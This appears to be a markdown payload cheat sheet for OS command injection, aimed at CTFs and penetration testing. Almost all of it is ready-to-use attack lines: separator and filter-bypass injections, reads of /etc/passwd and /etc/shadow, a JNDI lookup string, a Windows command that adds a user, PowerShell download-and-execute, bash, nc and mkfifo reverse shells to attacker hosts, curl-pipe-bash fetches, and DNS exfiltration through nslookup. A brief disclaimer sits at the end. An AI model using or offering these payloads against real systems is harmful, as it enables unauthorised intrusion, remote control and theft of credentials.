# 💻 Command Injection Payloads & Bypass Techniques

A curated collection of **OS Command Injection (Command Injection)** payloads for **CTFs, penetration testing, and security research**.

---

## 📌 What is Command Injection?

Command Injection occurs when user input is **unsafely passed to system-level functions** like:

* `system()`
* `exec()`
* `popen()`

This allows attackers to execute **arbitrary OS commands**.

---

## 🎯 Common Testing Points

Look for parameters like:

```
?ip=127.0.0.1
?cmd=
?ping=8.8.8.8
?host=
search fields / input boxes
```

---

## ⚠️ Safe Testing First

Always begin with harmless commands:

```bash
id
whoami
ping -c 1 127.0.0.1
sleep 5
```

---

## 🔹 Basic Separators (No Filtering)

```bash
; id
&& id
|| id
| id
`id`
$(id)

; whoami
&& whoami
; ls -la
| ls
; cat /etc/passwd
&& cat /etc/passwd
```

---

## 🔹 Space Bypass Techniques

When spaces are filtered:

```bash
;${IFS}id
;$(IFS)$9id
;<TAB>id
;%09id
;%0aid

;cat${IFS}/etc/passwd
${IFS}cat${IFS}/etc/passwd
;cat</etc/passwd
```

---

## 🔹 Quote & Escape Bypass

```bash
\";id;\"
\';&id;\'
\;id\;
\\;id

";id#
';id#

`id`
$(id)

";${IFS}id;//
```

---

## 🔹 Encoding Bypass

```bash
%3b%20id
%3b%09id
%3bid%20
%253bid%20
\u003bid\u0020id

${jndi:ldap://attacker.com/a}
```

---

## 🔹 Windows-Specific Payloads

```bash
cmd.exe /c calc.exe
& whoami
| whoami
^& whoami
|| whoami

%0awhoami

;net user hacker pass123 /add
& powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
ping 127.0.0.1 & dir
```

---

## 🔹 Advanced Chaining & Execution

```bash
;/bin/bash -c "bash -i >& /dev/tcp/attacker_ip/4444 0>&1"
;nc -e /bin/sh attacker_ip 4444
;bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'

;wget -O- http://attacker/shell.sh | bash
;curl http://attacker/shell.sh | bash

;python -c 'import socket,subprocess,os;...'
;/bin/sh -c "sh -i >& /dev/tcp/attacker_ip/4444 0>&1"

&& ping -c 10 127.0.0.1 && id
;sleep 10
```

---

## 🔹 Blind Injection Techniques

```bash
;nslookup $(whoami).attacker.com
&& nslookup $(id).attacker.com
| nslookup `whoami`.attacker.com

;ping -c 1 $(whoami).attacker.com
;cat /etc/passwd | nc attacker_ip 4444

;for i in /etc/passwd /etc/shadow; do cat $i; done
;find / -perm -4000 2>/dev/null
```

---

## 🔹 Filter Bypass Tricks

```bash
ping`id`
ping${IFS}8.8.8.8;id
|${IFS}/bin/sh

bash${IFS}-c${IFS}"bash${IFS}-i>&${IFS}/dev/tcp/attacker_ip/4444${IFS}0>&1"

/.$IFS./.$IFS./bin/sh

;eval $(whoami)
'>/dev/null;id;#'
```

---

## 🔹 Reverse / Bind Shell Payloads

> ⚠️ Replace `attacker_ip` and `port` with your own

```bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
nc -e /bin/bash 10.0.0.1 4444

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f

mknod /tmp/p p && /bin/sh 0</tmp/p | nc 10.0.0.1 4444 1>/tmp/p

perl -e 'use Socket;...'
```

---

## 🧪 Fuzzing & Automation

### Tools

```bash
ffuf -u "http://target.com/ping?host=FUZZ" -w cmd_inj.txt -mc 200,302
```

* Burp Suite (Intruder / Repeater)
* commix

---

## 🔍 Detection Techniques

* ⏱ Time delay (`sleep 5`)
* 📄 Response content changes
* 🌐 DNS / HTTP callbacks
* ❗ Error messages

---

## 🚀 Post-Exploitation

After successful command execution:

```bash
sudo -l
```

* Run privilege escalation scripts:

  * `linpeas.sh`
  * `winPEAS.exe`

---

## 📂 Wordlist Usage

Save all payloads as:

```
cmd_inj.txt
```

Then use with fuzzing tools like `ffuf`.

---

## 📊 Testing Strategy

1. Basic separators (`;`, `&&`)
2. Space bypass (`${IFS}`)
3. Encoding
4. Blind injection
5. Reverse shells

---

## ⚠️ Disclaimer

This content is for **educational and ethical hacking purposes only**.
Do not test on systems without **proper authorization**.

---

## ⭐ Pro Tips

* Combine payloads with **Burp Suite**
* Use **Intruder for automation**
* Chain multiple bypass techniques
* Adapt payloads based on:

  * OS (Linux / Windows)
  * Input filtering
  * WAF behavior

---

